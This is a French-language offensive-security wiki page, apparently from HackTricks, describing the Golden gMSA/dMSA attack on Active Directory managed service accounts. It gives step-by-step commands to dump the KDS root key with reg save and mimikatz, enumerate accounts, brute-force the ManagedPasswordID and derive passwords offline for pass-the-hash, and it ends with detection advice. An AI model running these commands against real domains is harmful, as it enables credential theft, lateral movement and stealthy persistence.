# Golden gMSA/dMSA Attack (Offline Derivation of Managed Service Account Passwords)

{{#include ../../banners/hacktricks-training.md}}

## Vue d'ensemble

Les Windows Managed Service Accounts (MSA) sont des principaux spéciaux conçus pour exécuter des services sans devoir gérer manuellement leurs mots de passe.
Il existe deux variantes principales :

1. **gMSA** – group Managed Service Account – peut être utilisé sur plusieurs hôtes autorisés dans son attribut `msDS-GroupMSAMembership`.
2. **dMSA** – delegated Managed Service Account – le successeur (en preview) de gMSA, reposant sur la même cryptographie, mais permettant des scénarios de délégation plus granulaires.

Pour les deux variantes, le **mot de passe n'est pas stocké** sur chaque Domain Controller (DC) comme un hash NT standard. À la place, chaque DC peut **dériver** le mot de passe actuel à la volée à partir de :

* La **KDS Root Key** à l'échelle de la forêt (`KRBTGT\KDS`) – un secret nommé par un GUID généré aléatoirement, répliqué sur chaque DC sous le conteneur `CN=Master Root Keys,CN=Group Key Distribution Service, CN=Services, CN=Configuration, …`.
* Le **SID** du compte cible.
* Un **ManagedPasswordID** (GUID) propre au compte, présent dans l'attribut `msDS-ManagedPasswordId`.

La dérivation est la suivante : `AES256_HMAC( KDSRootKey , SID || ManagedPasswordID )` → un blob de 240 octets finalement **encodé en base64** et stocké dans l'attribut `msDS-ManagedPassword`.
Aucun trafic Kerberos ni interaction avec le domaine n'est requis lors de l'utilisation normale du mot de passe : un hôte membre dérive localement le mot de passe tant qu'il connaît les trois entrées.

## Golden gMSA / Golden dMSA Attack

Si un attaquant peut obtenir les trois entrées **offline**, il peut calculer les mots de passe actuels et futurs **valides** pour n'importe quel gMSA/dMSA de la forêt sans contacter à nouveau le DC, contournant ainsi :<sup>[[1]](#references)[[2]](#references)</sup>

* L'audit des lectures LDAP
* Les intervalles de changement de mot de passe (ils peuvent être pré-calculés)

Cela est analogue à un *Golden Ticket* pour les comptes de service.<sup>[[1]](#references)[[2]](#references)</sup>

### Prérequis

1. **Compromission au niveau de la forêt** d'un **DC** (ou Enterprise Admin), ou accès `SYSTEM` à l'un des DC de la forêt.
2. La capacité à énumérer les comptes de service (lecture LDAP / RID brute-force).
3. Un poste de travail .NET ≥ 4.7.2 x64 pour exécuter [`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) ou un code équivalent.<sup>[[3]](#references)</sup>

### Golden gMSA / dMSA
#### Phase 1 – Extract the KDS Root Key

Effectuez un dump depuis n'importe quel DC (Volume Shadow Copy / ruches SAM+SECURITY brutes ou secrets distants) :<sup>[[1]](#references)[[2]](#references)</sup>
```cmd
reg save HKLM\SECURITY security.hive
reg save HKLM\SYSTEM  system.hive

# With mimikatz on the DC / offline
mimikatz # lsadump::secrets
mimikatz # lsadump::trust /patch   # shows KDS root keys too

# With GoldendMSA
GoldendMSA.exe kds --domain <domain name>   # query KDS root keys from a DC in the forest
GoldendMSA.exe kds

# With GoldenGMSA
GoldenGMSA.exe kdsinfo
```
La chaîne base64 intitulée `RootKey` (nom GUID) est requise lors des étapes suivantes.<sup>[[1]](#references)[[2]](#references)</sup>

##### Phase 2 – Énumérer les objets gMSA / dMSA

Récupérez au moins `sAMAccountName`, `objectSid` et `msDS-ManagedPasswordId` :<sup>[[1]](#references)[[2]](#references)</sup>
```bash
# Authenticated or anonymous depending on ACLs
Get-ADServiceAccount -Filter * -Properties msDS-ManagedPasswordId | \
Select sAMAccountName,objectSid,msDS-ManagedPasswordId

GoldenGMSA.exe gmsainfo
```
[`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) implémente des modes auxiliaires :<sup>[[1]](#references)[[3]](#references)</sup>
```bash
# LDAP enumeration (kerberos / simple bind)
GoldendMSA.exe info -d example.local -m ldap

# RID brute force if anonymous binds are blocked
GoldendMSA.exe info -d example.local -m brute -r 5000 -u jdoe -p P@ssw0rd
```
##### Phase 3 – Deviner / découvrir le ManagedPasswordID (lorsqu’il est absent)

Certains déploiements *suppriment* `msDS-ManagedPasswordId` lors des lectures protégées par des ACL.
Comme le GUID fait 128 bits, le bruteforce naïf est irréalisable, mais :

1. Les **32 premiers bits = l’heure Unix epoch** de la création du compte (précision à la minute).
2. Suivis de 96 bits aléatoires.

Par conséquent, une **wordlist étroite par compte** (± quelques heures) est réaliste.
```bash
GoldendMSA.exe wordlist -s <SID> -d example.local -f example.local -k <KDSKeyGUID>
```
L’outil calcule les mots de passe candidats et compare leur blob base64 à l’attribut réel `msDS-ManagedPassword` – la correspondance révèle le GUID correct.

##### Phase 4 – Calcul et conversion hors ligne du mot de passe

Une fois le ManagedPasswordID connu, le mot de passe valide n’est plus qu’à une commande :<sup>[[1]](#references)[[2]](#references)</sup>
```bash
# derive base64 password
GoldendMSA.exe compute -s <SID> -k <KDSRootKey> -d example.local -m <ManagedPasswordID> -i <KDSRootKey ID>
GoldenGMSA.exe compute --sid <SID> --kdskey <KDSRootKey> --pwdid <ManagedPasswordID>
```
Les hachages obtenus peuvent être injectés avec **mimikatz** (`sekurlsa::pth`) ou **Rubeus** pour l’abus de Kerberos, permettant un **lateral movement** et une **persistence** furtifs.

## Détection et atténuation

* Restreindre les capacités de **sauvegarde des DC et de lecture des ruches du registre** aux administrateurs Tier-0.
* Surveiller la création du **Directory Services Restore Mode (DSRM)** ou de **Volume Shadow Copy** sur les DC.
* Auditer les lectures / modifications de `CN=Master Root Keys,…` et des indicateurs `userAccountControl` des comptes de service.
* Détecter les **écritures de mots de passe en base64** inhabituelles ou la réutilisation soudaine de mots de passe de service sur plusieurs hôtes.
* Envisager de convertir les gMSA disposant de privilèges élevés en **classic service accounts** avec des rotations aléatoires régulières lorsqu’un isolement Tier-0 n’est pas possible.

## Outils

* [`Semperis/GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) – implémentation de référence utilisée dans cette page.<sup>[[3]](#references)</sup>
* [`Semperis/GoldenGMSA`](https://github.com/Semperis/GoldenGMSA/) – implémentation de référence utilisée dans cette page.
* [`mimikatz`](https://github.com/gentilkiwi/mimikatz) – `lsadump::secrets`, `sekurlsa::pth`, `kerberos::ptt`.
* [`Rubeus`](https://github.com/GhostPack/Rubeus) – pass-the-ticket à l’aide de clés AES dérivées.

## Références

- [1] [Golden dMSA – contournement de l’authentification pour les Managed Service Accounts délégués](https://www.semperis.com/blog/golden-dmsa-what-is-dmsa-authentication-bypass/)
- [2] [Comptes d’attaque gMSA Active Directory](https://www.semperis.com/blog/golden-gmsa-attack/)
- [3] [Dépôt GitHub Semperis/GoldenDMSA](https://github.com/Semperis/GoldenDMSA)

{{#include ../../banners/hacktricks-training.md}}
